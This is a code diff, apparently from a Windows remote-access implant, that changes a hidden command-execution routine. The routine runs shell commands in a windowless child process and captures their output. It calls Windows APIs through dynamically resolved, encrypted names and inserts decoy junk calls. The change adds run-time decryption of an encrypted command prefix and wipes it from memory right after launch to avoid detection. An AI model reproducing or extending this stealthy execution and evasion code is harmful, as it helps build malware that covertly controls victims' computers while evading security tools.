@@ -24,7 +24,7 @@ namespace {
 		return message;
 	}
 
-	void createChildProc(HANDLE stdOutRead, HANDLE stdOutWrite, std::string command)
+	void createChildProc(HANDLE stdOutRead, HANDLE stdOutWrite, EncryptedString& cmd_string, std::string command)
 	{
 		PROCESS_INFORMATION procInfo;
 		STARTUPINFOA startInfo;
@@ -42,8 +42,13 @@ namespace {
 		if (garbage % 5 == 0)
 			junk();
 		
-		// Create the child process and run the command line
-		if (!resolve_dynamically<CreateProcessA_t>(str_CreateProcessA)(NULL, (char*)command.c_str(), NULL, NULL, true, CREATE_NO_WINDOW, NULL, NULL, &startInfo, &procInfo))
+		std::string cmdDecrypted = string_decrypt(cmd_string) + command;
+
+		// Create the child process and run the command line (Wipe the command as soon as CreateProcessA() returns)
+		bool result = resolve_dynamically<CreateProcessA_t>(str_CreateProcessA)(NULL, (char*)cmdDecrypted.c_str(), NULL, NULL, true, CREATE_NO_WINDOW, NULL, NULL, &startInfo, &procInfo);
+		wipeStr(cmdDecrypted);
+
+		if (!result)
 			throw std::runtime_error(GetLastErrorAsString());
 
 		resolve_dynamically<CloseHandle_t>(str_CloseHandle)(procInfo.hProcess);
@@ -52,7 +57,7 @@ namespace {
 	}
 }
 
-std::string exec(std::string command)
+std::string exec(EncryptedString &cmd_string, std::string command)
 {
 	SECURITY_ATTRIBUTES securityAttr;
 
@@ -72,18 +77,18 @@ std::string exec(std::string command)
 	if (!result) {
 		return "Error - CreatePipe() failed: " + GetLastErrorAsString();
 	}
-#endif // _DEBUG
+#endif
 
 	result = resolve_dynamically<SetHandleInformation_t>(str_SetHandleInformation)(stdOutRead, HANDLE_FLAG_INHERIT, 0);
 #ifdef _DEBUG
 	if (!result) {
 		return "Error - SetHandleInformation() failed: " + GetLastErrorAsString();
 	}
-#endif // _DEBUG
+#endif 
 
 	// Create the child process
 	try {
-		createChildProc(stdOutRead, stdOutWrite, command);
+		createChildProc(stdOutRead, stdOutWrite, cmd_string, command);
 	}
 	catch (const std::runtime_error& e) {
 		return e.what();
